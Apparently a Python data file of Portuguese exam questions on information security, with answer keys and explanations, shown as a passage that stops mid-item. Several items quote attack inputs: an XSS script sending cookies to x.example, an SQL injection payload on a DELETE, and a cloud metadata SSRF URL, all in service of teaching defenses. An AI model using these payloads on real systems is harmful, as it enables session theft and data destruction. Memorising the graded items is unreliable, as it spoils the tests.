# -*- coding: utf-8 -*-
"""Segurança da Informação (SEG) — cota 29."""
from comum import Q

E = "SEG"
T17 = "Segurança: princípios, vulnerabilidades e ataques"
QUESTOES = [
    # ---------------- variações ----------------
    Q(E, "04", 20, sub="20.6", pai="ESP-SEG-0001", top="LGPD: anonimização e pseudonimização", k="seg-pseudonimizacao",
      enun="A equipe de ciência de dados de um banco recebeu a tabela de transações com o CPF de cada cliente substituído por um token aleatório (por exemplo, `C-8F3A21`). A tabela que associa cada token ao CPF original fica guardada pela área de segurança, em ambiente controlado e separado. À luz da LGPD, esse tratamento é",
      alts=["anonimização, e os dados deixam de ser pessoais.",
            "bloqueio, pois suspende temporariamente o tratamento.",
            "eliminação, pois o CPF foi apagado da tabela.",
            "pseudonimização, e os dados continuam sendo dados pessoais.",
            "difusão, pois os dados foram compartilhados com outra área."],
      gab="D",
      com="**Gabarito: D.** Na **pseudonimização** (art. 13, § 4º), o dado perde a associação ao titular **senão pelo uso de informação adicional mantida separadamente** (a tabela de-para). É reversível por quem tem essa informação, por isso **continua sendo dado pessoal**.\n\n(A) Anonimização é irreversível por meios razoáveis, e não há tabela de correspondência. (B) Bloqueio é a suspensão temporária de qualquer operação de tratamento. (C) Eliminação é a exclusão do dado, que aqui pode ser recuperado. (E) Difusão é a divulgação dos dados, não a técnica aplicada."),

    Q(E, "04", 20, sub="20.6", pai="ESP-SEG-0001", top="LGPD: anonimização e pseudonimização", k="seg-hash-cpf", dif=3,
      enun="Um banco precisa disponibilizar a uma universidade uma base para pesquisa sem dados pessoais. Entre as medidas propostas, a que NÃO garante a anonimização, por permitir a reidentificação com esforço razoável, é",
      alts=["suprimir as colunas de nome, CPF, endereço e telefone.",
            "generalizar a idade em faixas (30–39) e o CEP para os três primeiros dígitos.",
            "substituir o CPF pelo seu hash SHA-256 sem chave secreta, mantendo as demais colunas inalteradas.",
            "agregar os dados em estatísticas por município e faixa etária.",
            "garantir k-anonimato, de modo que cada registro seja indistinguível de pelo menos k − 1 outros."],
      gab="C",
      com="**Gabarito: C.** O universo de CPFs é limitado: basta calcular o hash de todos os CPFs possíveis (ataque de dicionário) para reverter o SHA-256 sem chave. Além disso, as demais colunas mantidas permitem cruzamentos. Hash sem chave de CPF **não anonimiza**.\n\n(A) Supressão, (B) generalização, (D) agregação e (E) k-anonimato são técnicas de anonimização citadas na apostila.\n\nO script `tools/verificacao/agente4/verif_seg.py` demonstra a reversão do hash por força bruta em um subconjunto de CPFs."),

    Q(E, "04", 19, sub="19.4", pai="ESP-SEG-0002", top="SQL injection e consultas parametrizadas", k="seg-sqli-python", dif=3,
      enun="Considere a tabela `conta`, com 5 linhas cujos ids (inteiros) vão de 10 a 14, e o código Python a seguir, em que `id_conta` vem de um campo de formulário preenchido com o texto `10 OR 1=1`:\n\n```python\n# versão 1\ncur.execute(\"DELETE FROM conta WHERE id = \" + id_conta)\n# versão 2\ncur.execute(\"DELETE FROM conta WHERE id = ?\", (id_conta,))\n```\n\nExecutando cada versão sobre a tabela original (SQLite), o número de linhas removidas é, respectivamente,",
      alts=["1 e 1.",
            "5 e 5.",
            "5 e 0.",
            "0 e 5.",
            "1 e 0."],
      gab="C",
      com="**Gabarito: C.** Na **versão 1**, a concatenação transforma o dado em código: o comando vira `DELETE FROM conta WHERE id = 10 OR 1=1`, e a condição é verdadeira para **todas as 5 linhas**. Na **versão 2**, o placeholder `?` envia o texto `10 OR 1=1` como **valor**; nenhum id é igual a esse texto, e **0** linhas são removidas.\n\n(A) e (E) Supõem que só a linha 10 seria atingida. (B) Supõe que o placeholder também seria vulnerável. (D) Inverte as versões.\n\nExecutado em SQLite em `tools/verificacao/agente4/verif_seg.py`."),

    Q(E, "04", 17, sub="17.7", pai="ESP-SEG-0003", top="Ataques a aplicações web: XSS", k="seg-xss",
      enun="No campo \"apelido\" do cadastro de um aplicativo, um atacante gravou o texto `<script>fetch('https://x.example/?c='+document.cookie)</script>`. Sempre que um atendente abre a ficha desse cliente no painel interno, o script é executado no navegador do atendente. As medidas mais adequadas para eliminar essa vulnerabilidade são",
      alts=["usar consultas parametrizadas no banco de dados.",
            "codificar a saída conforme o contexto (HTML-escape) ao exibir dados e adotar uma Content Security Policy, além de cookies HttpOnly.",
            "aumentar o tamanho do campo apelido.",
            "usar HTTPS em todo o painel.",
            "aplicar backup diferencial diário da base de clientes."],
      gab="B",
      com="**Gabarito: B.** É **XSS armazenado**: o script fica gravado e roda no navegador de quem vê o dado. Defesas: **codificação de saída** conforme o contexto, validação de entrada, **CSP** e cookies **HttpOnly** (impedem que o script leia o cookie de sessão).\n\n(A) Consultas parametrizadas evitam SQL injection, não XSS. (C) Aumentar o campo não resolve. (D) HTTPS protege o transporte; o script chega cifrado do mesmo jeito. (E) Backup não previne o ataque."),

    Q(E, "04", 18, sub="18.5", pai="ESP-SEG-0004", top="Assinatura digital", k="seg-assinar-cifrar",
      enun="Ana precisa enviar a Bruno um contrato de modo que (1) somente Bruno consiga lê-lo e (2) Bruno possa comprovar que foi Ana quem o enviou e que ele não foi alterado. Usando criptografia assimétrica, Ana deve",
      alts=["cifrar o contrato com a chave privada de Bruno e assinar o hash com a chave pública de Ana.",
            "assinar o hash do contrato com a chave pública de Bruno e cifrar com a chave privada de Ana.",
            "cifrar o contrato e o hash com a chave pública de Ana.",
            "assinar o hash do contrato com a chave privada de Ana e cifrar o conjunto com a chave pública de Bruno.",
            "enviar o contrato em claro com o hash SHA-256 anexado, o que garante os dois requisitos."],
      gab="D",
      com="**Gabarito: D.** Autenticidade, integridade e não repúdio: **assinar** o hash com a **chave privada de Ana** (verificável com a pública dela). Sigilo: **cifrar** com a **chave pública de Bruno** (só a privada dele decifra). Na prática, cifra-se o conteúdo com uma chave simétrica e protege-se essa chave com a pública de Bruno.\n\n(A) Ana não tem a chave privada de Bruno. (B) Inverte o uso das chaves. (C) Cifrar com a pública de Ana só permitiria a ela mesma decifrar. (E) Hash sem assinatura não prova autoria (qualquer um recalcula) e não dá sigilo."),

    Q(E, "04", 18, sub="18.4", pai="ESP-SEG-0004", top="Funções hash criptográficas", k="seg-hash-propriedades",
      enun="Um sistema publica, ao lado de cada arquivo de remessa, o resumo SHA-256 do arquivo em hexadecimal. Sobre esse uso, é correto afirmar:",
      alts=["o resumo tem 64 caracteres hexadecimais (256 bits), qualquer alteração no arquivo produz um resumo totalmente diferente, e ele permite verificar a integridade, mas não garante, sozinho, a autoria.",
            "o resumo tem 256 caracteres hexadecimais e permite recuperar o arquivo original.",
            "o SHA-256 é um algoritmo de criptografia simétrica, e o resumo é o arquivo cifrado.",
            "arquivos de tamanhos diferentes geram resumos de tamanhos diferentes.",
            "o resumo garante a confidencialidade do arquivo de remessa."],
      gab="A",
      com="**Gabarito: A.** SHA-256 gera **256 bits = 64 caracteres hexadecimais**, de tamanho fixo, com efeito avalanche. Serve para verificar **integridade**; como qualquer um pode recalcular o hash, a **autoria** exige assinatura digital ou HMAC com chave.\n\n(B) São 64 caracteres, e o hash não é reversível. (C) Hash não é cifra. (D) O tamanho do resumo é fixo. (E) Hash não dá confidencialidade.\n\nTamanho conferido com `hashlib` em `tools/verificacao/agente4/verif_seg.py`."),

    Q(E, "04", 19, sub="19.2", pai="ESP-SEG-0005", top="OWASP Top 10:2021", k="seg-owasp-ssrf",
      enun="Uma API de importação de comprovantes recebe uma URL informada pelo usuário e baixa o arquivo a partir do servidor. Um atacante informou `http://169.254.169.254/latest/meta-data/` e obteve credenciais do serviço de metadados da nuvem. No OWASP Top 10:2021, edição citada no edital, essa falha corresponde à categoria",
      alts=["A03:2021 – Injection.",
            "A07:2021 – Identification and Authentication Failures.",
            "A06:2021 – Vulnerable and Outdated Components.",
            "A09:2021 – Security Logging and Monitoring Failures.",
            "A10:2021 – Server-Side Request Forgery (SSRF)."],
      gab="E", tags=["owasp-2021"],
      com="**Gabarito: E.** O servidor foi induzido a fazer requisições a destinos escolhidos pelo atacante (inclusive internos): **SSRF**, que na edição 2021 é a categoria **A10**. Defesas: lista de destinos permitidos, bloqueio de faixas internas e de metadados, segmentação.\n\n(A) Injection envolve dados interpretados como comando (SQL, SO, LDAP, XSS). (B) Trata de falhas de autenticação e sessão. (C) Trata de bibliotecas desatualizadas. (D) Trata de ausência de registro e alerta.\n\nObs.: na edição 2025 do OWASP Top 10 (vista na apostila), o SSRF foi absorvido pela categoria A01 Broken Access Control; o edital cobra a edição 2021."),

    Q(E, "04", 19, sub="19.2", pai="ESP-SEG-0005", top="OWASP Top 10:2021", k="seg-owasp-crypto",
      enun="Uma auditoria verificou que um sistema legado armazena as senhas dos clientes com MD5 sem salt e trafega dados de cartão por HTTP sem TLS em uma integração interna. No OWASP Top 10:2021, esses problemas se enquadram principalmente em",
      alts=["A01:2021 – Broken Access Control.",
            "A02:2021 – Cryptographic Failures.",
            "A04:2021 – Insecure Design.",
            "A05:2021 – Security Misconfiguration.",
            "A08:2021 – Software and Data Integrity Failures."],
      gab="B", tags=["owasp-2021"],
      com="**Gabarito: B.** **A02:2021 – Cryptographic Failures** (antes \"Sensitive Data Exposure\"): algoritmos fracos ou ausentes, senhas sem hash adequado (deveria ser bcrypt, scrypt, Argon2 ou PBKDF2, com salt), dados sensíveis sem TLS.\n\n(A) Trata de usuários agindo fora de suas permissões. (C) Trata de falhas de projeto e ausência de modelagem de ameaças. (D) Trata de configurações inseguras (padrões, mensagens de erro detalhadas, serviços desnecessários). (E) Trata de integridade de software e dados (pipelines, atualizações sem verificação, desserialização insegura)."),

    Q(E, "04", 20, sub="20.8", pai="ESP-SEG-0006", top="LGPD: agentes de tratamento", k="seg-encarregado", mv="A",
      enun="Segundo a LGPD, a pessoa indicada pelo controlador para atuar como canal de comunicação entre o controlador, os titulares dos dados e a autoridade nacional, cuja identidade e informações de contato devem ser divulgadas publicamente, é o",
      alts=["operador.",
            "encarregado.",
            "controlador conjunto.",
            "titular.",
            "suboperador."],
      gab="B",
      com="**Gabarito: B.** O **encarregado** (art. 5º, VIII, e art. 41) é o canal de comunicação com titulares e com a autoridade nacional; aceita reclamações, presta esclarecimentos, recebe comunicações da autoridade e orienta funcionários.\n\n(A) Operador trata dados em nome do controlador. (C) Controladores conjuntos decidem juntos sobre o tratamento. (D) Titular é a pessoa natural a quem os dados se referem. (E) Suboperador é contratado pelo operador."),

    Q(E, "04", 20, sub="20.5", pai="ESP-SEG-0006", top="LGPD: bases legais", k="seg-base-legal",
      enun="Um banco guarda os dados cadastrais e o histórico de operações de um ex-cliente por exigência da regulação do Banco Central e comunica ao COAF operações suspeitas, mesmo sem consentimento do titular. A base legal da LGPD que fundamenta esse tratamento é",
      alts=["o consentimento do titular, colhido na abertura da conta.",
            "o legítimo interesse do controlador.",
            "a proteção do crédito.",
            "a tutela da saúde.",
            "o cumprimento de obrigação legal ou regulatória pelo controlador."],
      gab="E",
      com="**Gabarito: E.** Guardar dados por exigência do Banco Central e comunicar operações suspeitas ao COAF (Lei 9.613/1998) é **cumprimento de obrigação legal ou regulatória** (art. 7º, II), que dispensa consentimento e também autoriza a conservação após o término da relação (art. 16, I).\n\n(A) O consentimento é revogável e não é a base adequada para obrigações legais; não há hierarquia entre bases. (B) Legítimo interesse exige balanceamento e não é o fundamento de uma obrigação legal. (C) Proteção do crédito trata de birôs e análise de crédito. (D) Tutela da saúde é restrita a profissionais e serviços de saúde."),

    Q(E, "04", 17, sub="17.8", pai="ESP-SEG-0013", top="Mecanismos de defesa de rede: IDS e IPS", k="seg-ips-inline",
      enun="Um banco posicionou um equipamento em linha entre o firewall de borda e a DMZ. Ao identificar, por assinatura, uma tentativa de exploração conhecida contra o servidor web, o equipamento descartou os pacotes e encerrou a sessão, além de gerar o alerta. Trata-se de um",
      alts=["IDS baseado em host (HIDS).",
            "IDS de rede (NIDS) operando por espelhamento de porta.",
            "honeypot.",
            "IPS de rede.",
            "SIEM."],
      gab="D",
      com="**Gabarito: D.** O **IPS** opera **em linha** e **bloqueia** o tráfego malicioso, além de alertar.\n\n(A) e (B) O IDS detecta e alerta; geralmente recebe cópia do tráfego (espelhamento) e não bloqueia; o HIDS fica no próprio host. (C) Honeypot é isca para atrair atacantes. (E) O SIEM correlaciona logs e eventos; não fica em linha bloqueando pacotes."),

    Q(E, "04", 17, sub="17.8", pai="ESP-SEG-0013", top="Mecanismos de defesa de rede: firewall e WAF", k="seg-waf",
      enun="O internet banking recebe tentativas de SQL injection e de XSS em parâmetros das requisições HTTPS. O firewall de rede stateful da borda não as bloqueia, pois as conexões para a porta 443 são legítimas. O controle adicional mais específico para esse cenário é um",
      alts=["WAF (Web Application Firewall) diante da aplicação, inspecionando o conteúdo das requisições HTTP.",
            "firewall de filtragem de pacotes stateless, com regras por IP e porta.",
            "servidor DHCP com reservas.",
            "NAC baseado em 802.1X.",
            "proxy direto (forward) para os funcionários."],
      gab="A",
      com="**Gabarito: A.** O **WAF** protege aplicações **web**, inspecionando a camada 7 (parâmetros, cabeçalhos, corpo) contra SQLi, XSS e outros ataques, como o ModSecurity e os WAFs de nuvem. Não substitui o código seguro.\n\n(B) Filtragem por IP e porta não vê o conteúdo HTTP. (C) DHCP distribui endereços. (D) NAC controla a admissão de dispositivos na rede interna. (E) Proxy direto atende os usuários internos, não protege o servidor."),

    Q(E, "04", 17, sub="17.8", pai="ESP-SEG-0012", top="Backup e recuperação", k="seg-backup-incremental", tags=["calculo"],
      enun="Uma política faz backup completo aos domingos e backups incrementais de segunda a sábado, ao fim de cada dia. Um ransomware cifrou o servidor na sexta-feira à tarde, antes do backup do dia. Para restaurar a situação mais recente possível, serão necessários",
      alts=["apenas o backup completo de domingo.",
            "o backup completo de domingo e o incremental de quinta-feira.",
            "o backup completo de domingo e os incrementais de segunda, terça, quarta e quinta-feira.",
            "apenas os incrementais de segunda a quinta-feira.",
            "o backup completo de domingo e o incremental de sexta-feira."],
      gab="C",
      com="**Gabarito: C.** O **incremental** copia o que mudou desde o **último backup de qualquer tipo**; por isso a restauração exige o último completo **e todos os incrementais** da sequência: domingo + segunda, terça, quarta e quinta (5 conjuntos).\n\n(A) Perderia quatro dias. (B) Seria suficiente com backups **diferenciais**. (D) Sem o completo, os incrementais não bastam. (E) O backup de sexta não chegou a ser feito.\n\nSequência conferida em `tools/verificacao/agente4/verif_seg.py`."),

    Q(E, "04", 18, sub="18.3", pai="ESP-SEG-0014", top="Criptografia simétrica e assimétrica", k="seg-hibrida-tls",
      enun="Em uma conexão HTTPS com TLS, a criptografia assimétrica e a simétrica são usadas de forma combinada. É correto afirmar que",
      alts=["todo o tráfego da sessão é cifrado com RSA, pois a criptografia simétrica é insegura.",
            "a criptografia assimétrica (e a troca de chaves Diffie-Hellman) é usada para autenticar o servidor e estabelecer uma chave de sessão, e os dados são cifrados com algoritmo simétrico, como o AES.",
            "o servidor envia sua chave privada ao navegador para que ele decifre as respostas.",
            "a chave de sessão é a própria chave pública do certificado do servidor.",
            "o TLS dispensa certificados quando usa criptografia simétrica."],
      gab="B",
      com="**Gabarito: B.** É o esquema **híbrido**: o assimétrico (certificado do servidor, assinaturas e troca de chaves por Diffie-Hellman efêmero) autentica e estabelece a **chave de sessão**; os dados seguem cifrados com algoritmo **simétrico** (AES-GCM, ChaCha20), muito mais rápido.\n\n(A) Cifrar todo o tráfego com RSA seria lento; o simétrico não é inseguro. (C) A chave privada nunca sai do servidor. (D) A chave de sessão é simétrica e efêmera. (E) O certificado continua sendo usado para autenticar o servidor."),

    Q(E, "04", 18, sub="18.6", pai="ESP-SEG-0019", top="Certificado digital e ICP", k="seg-revogacao", mv="A",
      enun="O token com o certificado A3 de um diretor foi furtado e a autoridade certificadora revogou o certificado. Para que os sistemas que recebem documentos assinados verifiquem, no momento da validação, que esse certificado não é mais válido, eles devem consultar",
      alts=["a cadeia de certificação até a AC Raiz, que é suficiente para detectar a revogação.",
            "a data de validade impressa no certificado, que é alterada automaticamente pela AC.",
            "a Lista de Certificados Revogados (LCR) publicada pela AC ou o serviço OCSP.",
            "a Autoridade de Registro que identificou o titular.",
            "o hash do documento assinado."],
      gab="C",
      com="**Gabarito: C.** A revogação é verificada na **LCR** (CRL), assinada e publicada pela AC, ou de forma online pelo **OCSP**.\n\n(A) A cadeia de certificação prova a emissão por AC confiável, não informa revogação. (B) O certificado é assinado e não é alterado; a validade original continua lá. (D) A AR identifica solicitantes; quem revoga e publica a LCR é a AC. (E) O hash do documento verifica a integridade do conteúdo."),

    Q(E, "04", 19, sub="19.5", pai="ESP-SEG-0023", top="IAM, SSO, OAuth 2.0 e OpenID Connect", k="seg-oidc", mv="E",
      enun="Um banco quer oferecer login único (SSO) aos seus aplicativos, de modo que cada aplicação receba, após a autenticação no provedor de identidade corporativo, um token com informações sobre quem é o usuário autenticado. Sobre o uso de OAuth 2.0 e OpenID Connect (OIDC), é correto afirmar que",
      alts=["o OAuth 2.0, sozinho, é um protocolo de autenticação que define o ID Token.",
            "o OIDC é uma camada de identidade sobre o OAuth 2.0 que acrescenta o ID Token, um JWT com dados do usuário autenticado, e o endpoint UserInfo.",
            "o access token do OAuth 2.0 é destinado à aplicação cliente para identificar o usuário, e não deve ser enviado à API.",
            "o OIDC substitui o TLS na proteção dos tokens.",
            "o fluxo Implicit é o recomendado pelo OIDC para aplicações móveis."],
      gab="B",
      com="**Gabarito: B.** O **OAuth 2.0** é um framework de **autorização** delegada; para **autenticação** (login, SSO) usa-se o **OpenID Connect**, que acrescenta o **ID Token** (JWT com informações do usuário) e o endpoint UserInfo.\n\n(A) O OAuth 2.0 não define o ID Token nem é protocolo de autenticação. (C) O access token é apresentado à **API** (resource server) e carrega escopos. (D) TLS continua obrigatório. (E) O Implicit é desaconselhado; recomenda-se Authorization Code com PKCE."),

    Q(E, "04", 19, sub="19.5", pai="ESP-SEG-0023", top="IAM, SSO, OAuth 2.0 e OpenID Connect", k="seg-pkce",
      enun="Um aplicativo móvel de um banco, que não consegue guardar um segredo de cliente com segurança, precisa obter tokens OAuth 2.0 para acessar a API em nome do usuário, após login e consentimento. O fluxo recomendado é",
      alts=["Client Credentials, com o segredo embutido no aplicativo.",
            "Resource Owner Password Credentials, com o app recebendo usuário e senha.",
            "Implicit, com o token devolvido na URL.",
            "Authorization Code com PKCE.",
            "Device Code, por ser o mais simples para celulares."],
      gab="D",
      com="**Gabarito: D.** Para clientes com usuário — web, mobile, SPA — recomenda-se **Authorization Code + PKCE**: o PKCE impede que um código interceptado seja trocado por tokens, mesmo sem segredo de cliente.\n\n(A) Client Credentials é máquina a máquina, sem usuário, e um segredo embutido no app é extraível. (B) Password expõe a senha ao cliente e é desaconselhado. (C) Implicit expõe tokens e foi removido no OAuth 2.1. (E) Device Code é para dispositivos com entrada limitada (TVs, CLIs)."),

    Q(E, "04", 21, sub="21.4", pai="ESP-SEG-0034", top="Gestão de incidentes: NIST SP 800-61 Rev. 3 e ISO/IEC 27035-1", k="seg-nist-r3",
      enun="Sobre a NIST SP 800-61 Revisão 3, publicada em abril de 2025, é correto afirmar:",
      alts=["mantém o ciclo de quatro fases da revisão anterior: preparação; detecção e análise; contenção, erradicação e recuperação; e atividades pós-incidente.",
            "trata a resposta a incidentes como atividade isolada, separada da gestão de riscos de cibersegurança.",
            "organiza a resposta a incidentes pelas seis funções do NIST CSF 2.0: Governar, Identificar, Proteger, Detectar, Responder e Recuperar.",
            "restringe-se a incidentes em órgãos militares dos Estados Unidos.",
            "substitui a ISO/IEC 27001 como norma certificável de sistemas de gestão."],
      gab="C", tags=["datado"],
      com="**Gabarito: C.** A Rev. 3 (abr/2025) substituiu a Rev. 2 e adota as **seis funções do CSF 2.0**: Governar, Identificar e Proteger formam a base de preparação; Detectar, Responder e Recuperar são a resposta.\n\n(A) Descreve a Rev. 2, retirada. (B) A mensagem central é integrar a resposta à **gestão de riscos**. (D) É uma recomendação de aplicação geral. (E) Publicação do NIST não é norma certificável; a ISO/IEC 27001 continua sendo a referência de SGSI.\n\nReferência de data: NIST SP 800-61 Rev. 3, abril de 2025 (vigente em nov/2026)."),

    Q(E, "04", 21, sub="21.3", pai="ESP-SEG-0035", top="Gestão de incidentes: NIST SP 800-61 Rev. 3 e ISO/IEC 27035-1", k="seg-27035-licoes",
      enun="Após conter e erradicar um ataque de ransomware e restaurar os serviços, a equipe de resposta do banco fez a análise pós-incidente, identificou a causa raiz (RDP exposto à internet), atualizou os procedimentos e reforçou os controles. Segundo a ABNT NBR ISO/IEC 27035-1:2023, essas atividades pertencem à fase de",
      alts=["planejar e preparar.",
            "detectar e reportar.",
            "avaliar e decidir.",
            "responder.",
            "aprender lições."],
      gab="E",
      com="**Gabarito: E.** A fase **aprender lições** abrange a análise pós-incidente e a melhoria de controles e processos.\n\n(A) Planejar e preparar define política, equipe, procedimentos e ferramentas antes dos incidentes. (B) Detectar e reportar identifica e comunica eventos. (C) Avaliar e decidir classifica o evento e decide se é incidente. (D) Responder abrange conter, erradicar, recuperar e coletar evidências — etapas já concluídas no cenário."),

    Q(E, "04", 21, sub="21.2", pai="ESP-SEG-0033", top="Gestão de riscos: ISO/IEC 27005", k="seg-27005-modificar",
      enun="Para o risco de invasão de contas do internet banking por credenciais vazadas, o banco decidiu implantar autenticação multifator e monitoramento de comportamento, reduzindo a probabilidade de o risco se concretizar. Na ABNT NBR ISO/IEC 27005:2023, essa opção de tratamento é",
      alts=["modificar o risco, aplicando controles.",
            "reter o risco.",
            "evitar o risco.",
            "compartilhar o risco.",
            "transferir o risco ao titular."],
      gab="A",
      com="**Gabarito: A.** Aplicar controles para reduzir probabilidade ou impacto é **modificar** o risco. O que sobra depois é o risco residual.\n\n(B) Reter é aceitar o risco sem novos controles. (C) Evitar é eliminar a atividade que gera o risco (por exemplo, desligar o internet banking). (D) Compartilhar é dividir o risco com terceiros (seguro, terceirização). (E) Não é opção da norma."),

    Q(E, "04", 21, sub="21.5", pai="ESP-SEG-0036", top="Segurança em nuvem: ISO/IEC 27017", k="seg-27017-27018",
      enun="Sobre as normas de segurança da informação para serviços em nuvem, é correto afirmar que",
      alts=["a ISO/IEC 27017 trata exclusivamente da proteção de dados pessoais em nuvem pública e substitui a LGPD.",
            "a ISO/IEC 27018 é o código de prática com controles de segurança para provedores e clientes de nuvem, como segregação em ambientes virtuais.",
            "a ISO/IEC 27017 é um código de prática baseado na ISO/IEC 27002, com orientações para clientes e provedores, e a ISO/IEC 27018 trata da proteção de dados pessoais em nuvem pública.",
            "ambas são normas de requisitos certificáveis que substituem a ISO/IEC 27001.",
            "a ISO/IEC 27017 dispensa definir papéis e responsabilidades entre cliente e provedor."],
      gab="C",
      com="**Gabarito: C.** A **27017** é código de prática de segurança para serviços em nuvem (baseado na 27002), com orientações para cliente e provedor e controles próprios (responsabilidades compartilhadas, remoção de ativos, segregação em ambientes virtuais, hardening de VMs, monitoramento). A **27018** trata de **dados pessoais em nuvem pública**.\n\n(A) Atribui à 27017 o escopo da 27018; e nenhuma norma substitui a lei. (B) Atribui à 27018 o escopo da 27017. (D) São códigos de prática que complementam a 27001/27002. (E) Papéis e responsabilidades compartilhados são um dos controles acrescentados."),

    # ---------------- inéditas ----------------
    Q(E, "04", 17, sub="17.2", top="ISO/IEC 27001 e 27002", k="seg-27001-27002",
      enun="Sobre as normas ABNT NBR ISO/IEC 27001 e 27002, é correto afirmar que",
      alts=["a 27002 estabelece os requisitos do sistema de gestão e é a norma usada para certificação.",
            "a 27001 estabelece os requisitos de um Sistema de Gestão de Segurança da Informação (SGSI) e é certificável, enquanto a 27002 é um guia com orientações para implementar os controles.",
            "as duas são equivalentes e podem ser usadas indistintamente na certificação.",
            "a 27001 contém apenas controles técnicos, como firewall e criptografia.",
            "a 27002 trata exclusivamente de gestão de incidentes."],
      gab="B",
      com="**Gabarito: B.** A **27001** define os **requisitos do SGSI** (contexto, liderança, planejamento, apoio, operação, avaliação de desempenho e melhoria) e é **certificável**; seu Anexo A lista os controles de referência. A **27002** é o **código de prática** com orientações para implementar esses controles.\n\n(A) Inverte as normas. (C) Só a 27001 é certificável. (D) A 27001 é norma de gestão, com controles organizacionais, de pessoas, físicos e tecnológicos. (E) Incidentes são tema da série 27035."),

    Q(E, "04", 14, sub="14.9", top="Segurança em redes sem fio", k="seg-wpa3-eap",
      enun="Para a rede Wi-Fi corporativa de um banco, a área de segurança exige que cada funcionário se autentique com credencial própria ou certificado, validada em um servidor RADIUS integrado ao Active Directory, e que os quadros de gerenciamento sejam protegidos contra ataques de desautenticação. A configuração mais adequada é",
      alts=["WEP com chave de 128 bits e filtro por MAC.",
            "WPA com TKIP e SSID oculto.",
            "WPA3-Enterprise, com 802.1X e EAP (por exemplo, EAP-TLS), que exige PMF.",
            "rede aberta com portal cativo.",
            "WPA2-Personal com a mesma senha para todos e WPS habilitado."],
      gab="C",
      com="**Gabarito: C.** O modo **Enterprise** usa **802.1X** com **EAP** (EAP-TLS, PEAP) contra servidor **RADIUS** (ex.: NPS integrado ao AD), com credencial individual. O **WPA3** torna obrigatório o **PMF** (802.11w), que dificulta ataques de desautenticação.\n\n(A) WEP é quebrado; filtro por MAC é medida fraca. (B) TKIP é obsoleto; ocultar SSID é medida fraca. (D) Rede aberta não autentica usuários. (E) Senha compartilhada não identifica cada funcionário, e o WPS por PIN é vulnerável."),

    Q(E, "04", 16, sub="16.12", top="VPN, VPN-SSL e ZTNA; Zero Trust", k="seg-ztna",
      enun="Um banco quer substituir a VPN tradicional, que após a conexão dá ao usuário acesso amplo à rede interna, por um modelo em que cada acesso a cada aplicação é autenticado e autorizado considerando identidade, estado do dispositivo e contexto, sem expor a rede. Essa abordagem corresponde a",
      alts=["perímetro \"castelo e fosso\", com DMZ única.",
            "VPN site a site com IPsec em modo túnel.",
            "split tunneling na VPN de acesso remoto.",
            "ZTNA, alinhado ao modelo Zero Trust (\"nunca confie, sempre verifique\").",
            "NAT com encaminhamento de portas para cada aplicação."],
      gab="D",
      com="**Gabarito: D.** O **ZTNA** (Zero Trust Network Access) aplica o **Zero Trust**: nenhum acesso é confiável por estar \"dentro\"; cada acesso a cada aplicação é verificado (identidade, dispositivo, contexto), com microssegmentação e menor privilégio.\n\n(A) É o modelo tradicional que o Zero Trust supera. (B) VPN site a site liga redes inteiras. (C) Split tunneling só decide qual tráfego passa pelo túnel. (E) Expor portas por NAT aumenta a superfície de ataque."),

    Q(E, "04", 17, sub="17.8", top="Sistemas de proteção: firewall, WAF, UTM, DMZ, proxy, NAC", k="seg-utm",
      enun="Uma cooperativa de pequeno porte, com equipe de TI reduzida, adquiriu um único equipamento que reúne firewall, IPS, antivírus de gateway, filtro de conteúdo web, antispam e VPN, gerenciados em um só console. Esse tipo de solução é denominado",
      alts=["UTM (Unified Threat Management).",
            "SIEM.",
            "honeynet.",
            "HIDS.",
            "PAM."],
      gab="A",
      com="**Gabarito: A.** O **UTM** consolida várias funções de segurança (firewall, IPS, antivírus, filtro web, antispam, VPN) em um único equipamento, comum em pequenas e médias organizações.\n\n(B) SIEM coleta e correlaciona logs. (C) Honeynet é rede-isca. (D) HIDS detecta intrusões em um host. (E) PAM gerencia contas privilegiadas."),

    Q(E, "04", 17, sub="17.8", top="Sistemas de proteção: firewall, WAF, UTM, DMZ, proxy, NAC", k="seg-nac", mv="E",
      enun="Ao conectar um notebook a uma porta de rede da agência, o equipamento só recebe acesso à VLAN corporativa depois de autenticar o usuário via 802.1X e comprovar que tem antivírus ativo e atualizações em dia; caso contrário, é colocado em uma VLAN de quarentena. Essa solução é um",
      alts=["DLP.",
            "WAF.",
            "NAC (controle de admissão na rede).",
            "proxy reverso.",
            "IDS por anomalia."],
      gab="C",
      com="**Gabarito: C.** O **NAC** controla a **admissão** de dispositivos na rede, com autenticação (802.1X) e **verificação de postura** (antivírus, patches), podendo isolar dispositivos não conformes.\n\n(A) DLP impede vazamento de dados. (B) WAF protege aplicações web. (D) Proxy reverso fica na frente de servidores. (E) IDS detecta intrusões, não decide a admissão de dispositivos."),

    Q(E, "04", 17, sub="17.8", top="SOC, SIEM, EDR e segurança de endpoints", k="seg-siem-edr",
      enun="No centro de operações de segurança (SOC) de um banco, uma ferramenta reúne os logs de firewalls, servidores, Active Directory e aplicações e dispara um alerta ao correlacionar dez falhas de login seguidas de um acesso bem-sucedido, de outro país, para a mesma conta. Outra ferramenta, instalada nas estações, detecta comportamento suspeito de processos (como cifragem em massa de arquivos) e isola automaticamente a máquina. Essas ferramentas são, respectivamente,",
      alts=["EDR e SIEM.",
            "SIEM e EDR.",
            "NAC e WAF.",
            "IPS e DLP.",
            "UTM e honeypot."],
      gab="B",
      com="**Gabarito: B.** O **SIEM** centraliza, **correlaciona** logs e eventos e gera alertas (base do SOC); o **EDR** atua nos **endpoints**, detectando comportamento suspeito e respondendo (isolar a máquina, encerrar processos).\n\n(A) Inverte as ferramentas. (C) NAC controla a admissão de dispositivos e WAF protege aplicações web. (D) IPS bloqueia tráfego em linha e DLP evita vazamento de dados. (E) UTM consolida funções de perímetro e honeypot é isca."),

    Q(E, "04", 17, sub="17.2", top="Controle de acesso: autenticação, autorização, auditoria, RBAC e MFA", k="seg-rbac-mfa",
      enun="No sistema de crédito, as permissões são associadas a papéis como Caixa, Gerente e Auditor, e cada funcionário recebe um ou mais papéis. Para o login, exige-se senha e um código gerado por aplicativo no celular cadastrado. Esses mecanismos correspondem, respectivamente, a",
      alts=["DAC e autenticação de fator único.",
            "MAC e autenticação de fator único.",
            "ABAC e autenticação por dois fatores do mesmo tipo.",
            "RBAC e autenticação multifator (algo que se sabe e algo que se tem).",
            "RBAC e autenticação de fator único, pois ambos os fatores são digitados."],
      gab="D",
